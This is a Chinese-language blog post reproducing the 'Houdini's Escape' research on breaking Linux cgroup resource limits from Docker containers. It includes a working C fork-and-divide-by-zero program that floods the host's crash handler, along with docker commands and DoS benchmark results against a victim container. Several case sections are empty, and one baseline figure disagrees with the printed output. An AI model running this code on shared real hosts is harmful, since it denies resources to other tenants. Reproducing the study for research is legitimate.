---
layout: post
title: cgroup - Houdini's escape
categories: [cgroup, linux container, docker]
description: a recurrent of the cgroup escaping paper
keywords: cgroup, Docker, Linux container
---

## Linux Control Groups Escaping - Houdini

### Introduction

Linux Control Group，也称为 cgroups，是用于监控、限制 process 资源的一种 Linux kernel feature[^note1]。它同时也时操作系统级别容器化的重要组成模块。它将进程划分到多个分层的组，同时为这些组提供资源控制器，从而管理 CPU，内存还有块设备的输入输出。当创建子进程的时候，该子进程会自动从他的创建者那里拷贝 cgroup 属性，从而强制实行资源控制。然而，在创建进程的时候从父进程继承 cgroup 约束并不是万无一失的，有时候一致性和资源合理分配并不能很好的保持。

本文介绍的就是一种 cgroup escaping 的方法，被作者称之为 Houdini’s Escape，[这篇论文](https://gzs715.github.io/pubs/HOUDINI_CCS19.pdf)[^note2] 被 [CCS 2019](https://www.sigsac.org/ccs/CCS2019/) 会议[^note3] 录用。

论文主要针对之前提到的子进程 cgroup 进行攻击，使得该子进程脱离父进程的 cgroup 类别，从而进行 ou-of-band 攻击，使得同一物理机上的其他 container 的运行受到影响，同时还可以获得更多的资源（超出它本应该获得的范围）。我撰写该 blog 的目的是在于复现该论文的 esacape 方法，同时总结这些方法的特性和推广的价值。

### Cgroups Hierarchy and Controllers

> In Linux, cgroups are organized in a hierarchical structure where a set of cgroups are arranged in a tree. Each task (e.g., a thread) can only be associated with exactly one cgroup in one hierarchy, but can be a member of multiple cgroups in different hierarchies. Each hierarchy then has one or more subsystems attached to it, so that a resource controller can apply per-cgroup limits on specific system resources. With the hierarchical structure, the cgroups mechanism is able to limit the total amount of resources for a group of processes(e.g., a container).

上述是关于 cgroup 的架构介绍，重要的有以下几点

* 一个 cgroup 对应有一种 hierarchy
* 一个 task 在同类 hierarchy 中只能对应一个 cgroup
* 一个 task 可以有多个 cgroups
* resource controller 按照 cgroup 来进行具体资源的管控



Cgroup 相关的 resource controller 一共有四种

* **cpu controller**：在多个 cgroup 竞争 cpu 资源的时候，按照 cpu share 的值来按比例分配 cpu 资源，也可以通过设定 *quota* 和 *period* 来限制在固定周期内的 cpu 使用量
* **cpusets controller**：将 task 限制在具体的 cpu core 和 memory node 上
* **blkio controller**：控制和限制对于块设备的访问，可以通过设定 *blkio.weight* 来划分占用比例，也可以通过设置具体的上限
* **pid controller**：为 container 设置 task number 上限，上限存放在 *pids.max* 中，当前的 task 数目统计放在 *pids.current* 中，一旦达到上线，所有的 fork 和 clone 操作都会被禁止



### Cgroups Inheritance

> One important feature of cgroups is that child processes inherit cgroups attributes from their parent processes. 

子进程被创建时，会调用 fork() 或是 clone() 函数，一开始新创建的进程会 attach 到 root cgroup 上，在完成寄存器还有其他的进程环境拷贝之后，将会调用 cgroup 拷贝函数，将这个新创建的进程 attach 到创建它的父进程所属的 cgroups。

> Particularly, the function attaches the task to its parent cgroups by recursively going through all cgroup subsystems. As a result, after the copying procedure, the child task inherits memberships to the exact same cgroups as its parent task.

这个 cgroup 拷贝函数会把所有 cgroup subsystem 递归遍历一遍，最终实现将子进程的 cgroup 设置为和父进程完全一致。

举例来说，如果 cpusets 资源控制器将父进程指定为 2 号 cpu core，那么创建的子进程也会被指定为只能在 2 号 cpu core 上面运行。同时，如果 cpu 资源控制器对父进程设置了 *quota* 和 *period*，那么新创建的子进程将会和父进程共享这些资源，即子进程和父进程的 cpu 使用量加起来不能超过 *quota*。



### Exploiting Strategies



### Cases Reccurent

> We use the Docker container to set the configuration of cgroups through the provided interfaces. Besides, Docker also ensures that containers are isolated through namespaces bydefault. 
>
> Especially, with the USER namespace enabled, the root user in a container is mapped to a non-privileged user on the host. Thus, the privileged operations within containers cannot affect the host kernel. Our case studies are conducted in such de-privileged containers.



#### Case 1: Exception Handling

##### constrains

* cpu core: 1
* cpu share: 100%, 10%, 5%
* pid limitation: None, 100, 50

##### method

首先确保安装了 docker[^note4] 并且下载了 ubuntu 镜像。若没有下载，在第一次运行该镜像时会自动下载。

接下来明确 docker run 的参数以及观察 cpu 使用情况时用到的工具。



docker run 语句如下

```shell
$ docker run --cpuset-cpus="0" --cpus=0.1 --pids-limit=50 -v /home/zty/dev/cfile:/tmp/cfile --rm -it ubuntu
```

* 这里没有像论文里说的那样用 user namespace 来实现非 root，考虑后续实现
*  https://docs.docker.com/engine/security/userns-remap/  参考这个

讲解一下基本的参数，更多的参数说明请参考官方文档[^note5]

* *--cpuset-cpus* 指定了 container 运行在哪个 cpu core 上，可以指定单个或者多个
* *--cpus* 指定了 container 可以使用 cpu 资源的上限，举例来说，上述语句里面的值为 0.1，那么 container 可以使用的 cpu 资源上限就是 10%，也可以用 *--cpu-period* 和 *--cpu-quota* 捆绑使用来[实现相同的功能]( https://docs.docker.com/engine/reference/run/#cpu-period-constraint )[^note6]
* *--pids-limit* 指定了进程数目的上线，一旦超过这个上限，就会返回 *fork: Interrupted system call* 的错误信息
* 剩下的 *-v* 是文件映射，为了执行在 Host 上编译生成的文件



接下来需要做的是编写 expoit code，用来制造 faults 从而实现 escape from parrent cgroup。

编写的文件如下

```c
#include <stdio.h>
#include <unistd.h>
#include<sys/wait.h> 
#include<sys/types.h> 
int main()
{
    while(1) {
        int pid = fork();
        if(pid == 0) {
            int i = 1 / 0;
            return 0;
        }
        // ignore the SIGCHLD signal
        signal(SIGCHLD,SIG_IGN);
    }
    return 0;
}
```

逻辑很简单，父进程在不停的循环执行 fork 操作，而成功生成的子进程则负责执行 *div 0* 操作引发 faults。其中 ignore `SIGCHLD  `信号的原因参考[这篇文章](https://tianyuzhou.top/2019/10/21/fork-in-c/)。具体产生的 fault 如下

```
Floating point exception(core dumped)
```

将该文件编译好之后，可以尝试运行，但由于会不断的制造 fault，造成 Host 的 cpu 直接被占满，我在实验的时候根本就无法进行后续操作了，只能重启电脑。

按照论文里面的说法，对于 Ubuntu 而言，处理这些 faults 的应用是 *Apport*，因此在我们执行这个程序的时候，Apport 进程将会大量产生，从而占满 cpu。

下面的是运行 top 命令对于该文件运行时的监控

```
top - 16:46:18 up  2:02,  1 user,  load average: 15.93, 4.08, 1.68
Tasks: 470 total,  55 running, 319 sleeping,   0 stopped,   1 zombie
%Cpu0  : 84.7 us, 15.3 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu1  : 93.2 us,  6.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu2  : 94.1 us,  5.9 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu3  : 92.2 us,  7.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu4  : 91.5 us,  8.5 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu5  : 89.9 us, 10.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu6  : 92.5 us,  7.5 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu7  : 91.2 us,  8.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu8  : 91.9 us,  8.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu9  : 92.2 us,  7.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu10 : 91.9 us,  8.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
%Cpu11 : 91.6 us,  8.4 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem : 16212396 total, 10905352 free,  3395860 used,  1911184 buff/cache
KiB Swap:  2097148 total,  2097148 free,        0 used. 12426024 avail Mem 

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
 7647 root      20   0    4372   1080   1008 R   8.9  0.0   0:01.63 pppp
26842 root      20   0   98756  24208  11808 R   4.3  0.1   0:00.13 apport
26847 root      20   0   98236  23900  11752 R   3.9  0.1   0:00.12 apport
26852 root      20   0   98236  23004  11356 R   3.9  0.1   0:00.12 apport
27400 root      20   0   98756  24316  11916 R   3.9  0.1   0:00.12 apport
27403 root      20   0   98236  23268  11396 R   3.9  0.1   0:00.12 apport
... lots of apport
```

运行 top 命令之后按下数字键盘中的 1，可以分不同的 core 来展示 cpu 的使用量，上图是运行的一个截图，并不是稳定的值，只是 cpu 被无数个 apport 占满时的一个时刻的情况

而此刻，我也用 *docker stats* 命令监视着容器的情况

```
NAME            CPU %       MEM USAGE / LIMIT     MEM %         PIDS
nifty_gauss     10.66%      10.5MiB / 15.46GiB    0.07%         50
```

为了方便展示，我把 container ID，Net I/O，Block I/O 这些字段删除了，重点关注容器的 cpu 占用，我们发现短时间内 cpu 使用率为 10.66%，在持续观察的过程中，基本都在 10% 上下，也符合之前设定的 10% 以内，因此在这种情况下，其实是 Apport 这个 core dump application 占用了大量的 CPU。



##### Different Cpu Share & PID Limitation



<div id="container" style="weight:80%; height: 600px"></div>
<script type="text/javascript" src="/js/dist/echarts.min.js"></script>
<script type="text/javascript" src="/js/dist/echarts-gl.min.js"></script>
<script type="text/javascript" src="/js/dist/ecStat.min.js"></script>
<script type="text/javascript" src="/js/dist/extension/dataTool.min.js"></script>
<script type="text/javascript" src="/js/dist/extension/bmap.min.js"></script>
<script type="text/javascript">
var dom = document.getElementById("container");
var myChart = echarts.init(dom);
var app = {};
option = null;
var seriesLabel = {
normal: {
show: true,
position: 'right',
textBorderWidth: 2
}
}
option = {
tooltip: {
trigger: 'axis',
axisPointer: {
type: 'shadow'
}
},
legend: {
data: ['Container Utilization', 'Host Utilization (100% for container)', 'Host Utilization (10% for container)', 'Host Utilization (5% for container)'],
left: '30'
},
xAxis: {
type: 'value',
name: '%',
axisLabel: {
formatter: '{value}'
}
},
yAxis: {
type: 'category',
name: 'PID limit',
nameLocation: 'start',
inverse: true,
data: ['none', '100', '50'],
axisLabel: {
formatter: function (value) {
return value;
},
margin: 20,
rich: {
value: {
lineHeight: 30,
align: 'center'
}
}
}
},
series: [
{
name: 'Container Utilization',
type: 'bar',
data: [7.14, 11.5, 15],
label: seriesLabel
},
{
name: 'Host Utilization (100% for container)',
type: 'bar',
label: seriesLabel,
data: [1200, 1200, 1200]
},
{
name: 'Container(10%)',
type: 'bar',
data: [2.56, 10.09, 10.38],
label: seriesLabel,
itemStyle: {
color: '#c23531'
}
},
{
name: 'Host Utilization (10% for container)',
type: 'bar',
label: seriesLabel,
data: [1200, 1200, 1200]
},
{
name: 'Container(5%)',
type: 'bar',
data: [3.04, 5.35, 5.13],
label: seriesLabel,
itemStyle: {
color: '#c23531'
}
},
{
name: 'Host Utilization (5% for container)',
type: 'bar',
label: seriesLabel,
data: [1200, 1200, 1200]
}
]
};
;
if (option && typeof option === "object") {
    myChart.setOption(option, true);
}
</script>



在上图中，只要在 container 中 run 我们之前编写的 exploit 程序，Host Utilization 即物理主机 cpu 使用量就会达到 1200%，因为物理机一共有 12 个 cpu core。可以看到在每个 pid limit 小组当中，container 的 cpu 使用量都是随着 cpu share 的限制逐步降低的，但有部分内容与论文当中展示的数据图表不同，主要有以下几点

* **所有的 Host Utilization 均为 1200%**，不存在有 cpu 未被占满的情况
* 由上一点可以看出，**限制 container 的 cpu share 并不能缓解 host cpu 滥用这一情况**
* 随着 PID limit 的变化，container utilization 并没有大幅度的变化，事实上，因为在不限制 PID limit 的时候可以在短时间内创建大量的 core dump，因此 container utilization 还比其他的情况要低一些



##### DoS Attack

由于 sysbench 需要在容器当中使用，所以可以创建一个新的 image 然后保存它，之后每次都可以用这个 image 来实验，因为 sysbench 要用好几次。

```dockerfile
FROM ubuntu
MAINTAINER Tianyu <lufeihaizei2008@gmail.com>
COPY ./apt /apt-info
RUN cp /apt-info/sources.list /etc/apt/
RUN apt-get update
RUN yes | apt-get install sysbench
```

利用上述的文件创建新的 image，然后利用新的 image 创建 victim container。

```
tianyu-ubuntu/
├── apt
│   └── sources.list
└── Dockerfile
```

树型文件目录如上图所示，其中 apt 文件夹和 sources.list 文件是用来更新 apt-get 源，因为在国内需要用[国内的镜像](https://mirrors.zju.edu.cn/)。具体的 Dockerfile instruction 介绍请参考[官方文档](https://docs.docker.com/engine/reference/builder/)。

然后在 `cgroup-escape/` 目录运行以下命令

```shell
$ docker build -t tianyu/ubuntu:v1 .
```

然后就可以在 docker images 当中看到我们新建的 image 了

```shell
$ docker images
REPOSITORY         TAG     IMAGE ID          CREATED             SIZE
tianyu/ubuntu      v1      ab7bed523666      7 seconds ago       131MB
```

在这个容器当中可以使用 [sysbench](https://github.com/akopytov/sysbench) 这个 cpu/memory 测试工具。这项工具的具体使用方法参照[这里](https://www.howtoforge.com/how-to-benchmark-your-system-cpu-file-io-mysql-with-sysbench)。

在论文里面，对于性能的描述单位是

* events per second for cpu
* MiB per second for memory and I/O

在这个 Dos Attack Case 里面，要运行 2 个 containers：一个是 malicious container，一个是 victim container。

首先在 victim 当中运行 sysbench 性能测试，得到无任何干扰的 baseline，然后在相同和不同 cpu core 同时运行 victim/malicious container，查看对于 victim container 性能的影响。

文章中说 victim container 和 malicious container 的 cpu share 和 quota 都一致，我在实验的时候设置的值如下

* cpu share 的值为默认的 1024
* cpu core 设定为 0 号
* quota 的值未设定，而是通过 *--cpus=".5"* 来设置，即最多不超过 50%。

首先是 base line 的 sysbench 测试

```shell
$ docker run --cpuset-cpus="0" --cpus=".5" --rm -it tianyu/ubuntu:v1
root@84a29dfee4a6:/# sysbench --test=cpu --cpu-max-prime=20000 run
sysbench 1.0.11 (using system LuaJIT 2.1.0-beta3)
Running the test with following options:
Number of threads: 1
Initializing random number generator from current time

Prime numbers limit: 20000
Initializing worker threads...
Threads started!

CPU speed:
    events per second:   218.67

General statistics:
    total time:                          10.0002s
    total number of events:              2188

Latency (ms):
         min:                                  1.57
         avg:                                  4.57
         max:                                 57.72
         95th percentile:                      9.22
         sum:                               9998.17

Threads fairness:
    events (avg/stddev):           2188.0000/0.00
    execution time (avg/stddev):   9.9982/0.00
```

sysbench 的测试结果显示，*events per second* 的值为 250.73。和论文当中的值 632.5 有较大差距，可能在于论文当中设置的 *--cpus* 参数值较大。我将 *--cpus* 改为 1 之后，得到的 *events per second* 的值为 627.17。

接着做同一个 cpu core 运行 malicious container 的实验，得到的 *events per second* 的值为 7.31。

最后是不同 cpu core 运行 malicious container 的实验，得到的 *events per second* 的值为 10.81。

类似的，关于 memory 和 I/O Read/Write 的实验也和上述步骤类似，具体的 sysbench 测试语句如下，我参考了[这个网站](https://linuxtechlab.com/benchmark-linux-systems-install-sysbench-tool/)

**memory**

```shell
# sysbench memory run
```

**I/O**

```shell
# sysbench --test=fileio --file-total-size=20G prepare
# sysbench --test=fileio --file-total-size=20G --file-test-mode=rndrw --max-time=300 --max-requests=0 run
# sysbench --test=fileio --file-total-size=20G cleanup
```

**最后得到的数据如下所示**

|                | CPU    | Memory  | I/O Read | I/O Write |
| -------------- | ------ | ------- | -------- | --------- |
| Baseline       | 250.73 | 2545.81 | 1.55     | 1.03      |
| same core      | 7.31   | 56.22   | 0.28     | 0.18      |
| different core | 10.81  | 68.74   | 0.86     | 0.58      |

把**减少率**可视化如下图所示

<div id="container2" style="weight:80%; height: 600px"></div>
<script type="text/javascript" src="/js/dist/echarts.min.js"></script>
<script type="text/javascript" src="/js/dist/echarts-gl.min.js"></script>
<script type="text/javascript" src="/js/dist/ecStat.min.js"></script>
<script type="text/javascript" src="/js/dist/extension/dataTool.min.js"></script>
<script type="text/javascript" src="/js/dist/extension/bmap.min.js"></script>
<script type="text/javascript">
var dom = document.getElementById("container2");
var myChart = echarts.init(dom);
var app = {};
option = null;
var seriesLabel = {
normal: {
show: true,
position: 'right',
textBorderWidth: 2
}
}
option = {
    title: {
        text: 'Annual Rate'
    },
    tooltip: {
        trigger: 'axis'
    },
    legend: {
        data:['same core','different core']
    },
    grid: {
        left: '3%',
        right: '4%',
        bottom: '3%',
        containLabel: true
    },
    xAxis: {
        type: 'category',
        data: ['CPU','Memory','I/O Read','I/O Write']
    },
    yAxis: {
        type: 'value'
    },
    series: [{
            name:'same core',
            type:'line',
            data:[97.09, 97.8, 81.94, 82.53]
        },
        {
            name:'different core',
            type:'line',
            data:[95.69, 97.3, 44.52, 43.69]
        }
    ]
};
;
if (option && typeof option === "object") {
    myChart.setOption(option, true);
}
</script>



#### Case 2: Data Synchronization





#### Case 3

#### Case 4

#### Case 5



### References

[^note1]:  cgroup man page: http://man7.org/linux/man-pages/man7/cgroups.7.html.

[^note2]: Gao, Xing, et al. "Houdini’s Escape: Breaking the Resource Rein of Linux Control Groups." (2019).
[^note3]: The 26th ACM Conference on Computer and Communications Security in **London, United Kingdom from November 11 to November 15, 2019**.

[^note4]: Docker installation and configuration: https://tianyuzhou.top/wiki/docker-install/.
[^note5]:Docker official Documentation of docker run command:  https://docs.docker.com/engine/reference/commandline/run/.
[^note6]: Docker container cpu period constaint: https://docs.docker.com/engine/reference/run/#cpu-period-constraint.

